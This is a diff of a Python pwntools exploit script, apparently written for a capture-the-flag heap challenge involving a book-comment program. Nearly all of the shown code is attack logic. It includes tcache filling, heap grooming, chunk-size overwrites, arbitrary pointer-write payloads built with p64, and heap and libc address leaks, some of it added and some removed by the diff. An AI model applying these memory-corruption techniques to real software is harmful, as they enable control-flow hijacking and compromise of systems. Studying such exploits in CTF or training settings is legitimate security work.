@@ -31,7 +31,7 @@ def del_comment(p: process, id: int, book_idx: int = 0):
     p.sendlineafter("What is the comment id? ", str(id))
     print("deleted: ", id)
 
-def return_book(p: process, add_comment: bool = False, comment_len: int = 50, comment: str = "comment", title: str = "title") -> int:
+def return_book(p: process, add_comment: bool = False, comment_len: int = 50, comment: str = "comment", title: str = "title", need_id: bool = True) -> int:
     id = 0
     p.sendlineafter("Your choice: ", "2")
     if add_comment:
@@ -40,9 +40,12 @@ def return_book(p: process, add_comment: bool = False, comment_len: int = 50, co
         p.sendlineafter("title: ", title)
         p.sendlineafter("content: ", comment)
 
-        data = p.recvline().decode().split(' ')[1]
-        id = int(data)
-        print("id: ", id)
+        if need_id:
+            data = p.recvline().decode().split(' ')[1]
+            id = int(data)
+            print("id: ", id)
+        else:
+            print("no id")
     else:
         p.sendline('n')
 
@@ -51,39 +54,9 @@ def return_book(p: process, add_comment: bool = False, comment_len: int = 50, co
 def logout(p: process):
     p.sendlineafter("Your choice: ", "4")
 
-def overwrite_top_chunk_size(p: process, new_top_chunk: int):
-    borrow_book(p)
-    return_book(p, True, 32, (b"a" * 8) + p64(new_top_chunk))
-    print("new top_chunk size:", hex(new_top_chunk & 0xFFFF_FFFF_FFFF_FFF8))
-
-def create_heap_trap(p: process, start: int = 100):
-    ids = []
-    for size in range(start, 1200, 50):
-        print(size)
-        borrow_book(p)
-        ids.append(return_book(p , True, size))
-    
-    for id in ids:
-        del_comment(p, id)
-
-def create_comment(p: process, size: int, comment: str = "comment", book: int = 0) -> int:
+def create_comment(p: process, size: int, comment: str = "comment", book: int = 0, need_id: bool = True) -> int:
     borrow_book(p, book)
-    return return_book(p, True, size, comment, "")
-
-def overwrite_chunk_size(p: process, size: int = 0x20, old_size: int = 1200):
-    size = size >> 4 #lower 3 bytes are for flags & 1 is empty
-    size = size << 4
-    create_heap_trap(p)
-    create_heap_trap(p)
-    create_heap_trap(p)
-    create_heap_trap(p)
-    create_comment(p, 1200)
-    id = create_comment(p, 1200)
-    ow_id = create_comment(p, old_size)
-    del_comment(p, id)
-    create_comment(p, 1200, (b"b" * (1200 - 24)) + p64(size))
-    print("comment chunk: ", id, "new size: ", size, "old size: ", old_size)
-    return ow_id
+    return return_book(p, True, size, comment, "", need_id)
 
 def fill_tcache(p: process, size: int, chunks: int = 7):
     ids = []
@@ -94,7 +67,7 @@ def fill_tcache(p: process, size: int, chunks: int = 7):
     for id in ids:
         del_comment(p, id)
 
-def arb_ptr_write_init(p: process):
+def arb_chks_init(p: process):
     global ARB_PTR_WRITE_CHK_ID
     global ARB_CHK_ID_B
     global EDITOR_CHK
@@ -103,13 +76,13 @@ def arb_ptr_write_init(p: process):
 
     id0 = create_comment(p, 0x1024)
     id1 = create_comment(p, 0x1024)
-    id2 = create_comment(p, 0x1024)
+    create_comment(p, 0x1024, need_id=False)
     del_comment(p, id0)
     del_comment(p, id1)    
 
     EDITOR_CHK = create_comment(p, 0x1200)
     SAFE_CHK = create_comment(p, 0x1200)
-    TMP_CHK = create_comment(p, 0x1200)
+    TMP_CHK = create_comment(p, 0x1200, book=3)
     
     del_comment(p, SAFE_CHK)
     SAFE_CHK = create_comment(p, 0x11a0)
@@ -120,30 +93,6 @@ def arb_ptr_write_init(p: process):
     logout(p)
     login(p)
 
-
-def arb_re_write_chk(p: process):
-    global ARB_PTR_WRITE_CHK_ID
-    global EDITOR_CHK
-    print("EDITOR_CHK:", EDITOR_CHK)
-    #del_comment(p, EDITOR_CHK)
-    p.interactive()
-    EDITOR_CHK = create_comment(p, 0x1200, (p64(0x61) + p64(0x60)) * ((0x1200 - 24 - 8) // 8 // 2) + b"\x60\x00\x00\x00\x00\x00\x00\x00" + p64(0x1211))
-    p.interactive()
-    del_comment(p, ARB_PTR_WRITE_CHK_ID)
-
-    del_comment(p, EDITOR_CHK)
-    EDITOR_CHK = create_comment(p, 0x1200, (p64(0x61) + p64(0x60)) * ((0x1200 - 24 - 8) // 8 // 2) + b"\x60\x00\x00\x00\x00\x00\x00\x00" + p64(0x1261))
-
-    ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x1250, b"a" * (0x1200 - 32) + p64(0x60) + p64(0x61) + p64(0x60))
-
-def arbitrary_pointer_write(p: process, addr: int, data: str):
-    global ARB_PTR_WRITE_CHK_ID
-    del_comment(p, ARB_PTR_WRITE_CHK_ID)
-    ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x2000, b"b"*0x11f0 + p64(0x0) + p64(0x6161) + b"b" * 0x18 + p64(0x6161) + (b"b" * 0x18) + p64(addr))
-    logout(p)
-    login(p, CHK_USR, CHK_PWD)
-    return_book(p, True, len(data) + 0x30, data)
-    
 def parse_heap_leak_line(line: str):
     real_line = b'the full guide to insanity: heap exploitation" by rozav\n' + b'a' * 10 #padding
     addr = 0
@@ -159,11 +108,21 @@ def parse_heap_leak_line(line: str):
 
     return int.from_bytes(data, 'little')
 
+def fill_tcache(p: process, size: int, chunks: int = 7):
+    ids = []
+    for _ in range(chunks):
+        #create_comment(p, 1200)
+        ids.append(create_comment(p, size, "a"))
+
+    for id in ids:
+        del_comment(p, id)
+
 def leak_heap(p: process):
     global ARB_PTR_WRITE_CHK_ID
     global ARB_CHK_ID_B
     global EDITOR_CHK
     global SAFE_CHK
+    global TMP_CHK
 
     logout(p)
     login(p, CHK_USR, CHK_PWD)
@@ -179,7 +138,9 @@ def leak_heap(p: process):
 
     logout(p)
     login(p , "aa", "bb")
-    return_book(p, True, 0x50, "noam", "afergan")
+
+    del_comment(p, TMP_CHK, 3)
+    return_book(p, True, 0x1200)
     
     p.sendline("1")
     for i in range(11):
@@ -188,7 +149,14 @@ def leak_heap(p: process):
     line = p.recvline()
     leak = parse_heap_leak_line(line)
     print("heap leak: ", hex(leak))
+    p.sendline("5")
     return leak
+
+def leak_libc(p: process, heap_leak: int):
+    global ARB_PTR_WRITE_CHK_ID
+    global ARB_CHK_ID_B
+    global EDITOR_CHK
+    global SAFE_CHK
 
 def main():
     ### run ###
@@ -201,12 +169,16 @@ def main():
     login(p)
 
     ### init ###
-    arb_ptr_write_init(p)
+    arb_chks_init(p)
 
     ### leaks ###
     heap_leak = leak_heap(p)
-
     if heap_leak == 0:
+        p.close()
+        main()
+
+    libc_leak = leak_libc(p, heap_leak)
+    if libc_leak == 0:
         p.close()
         main()
 
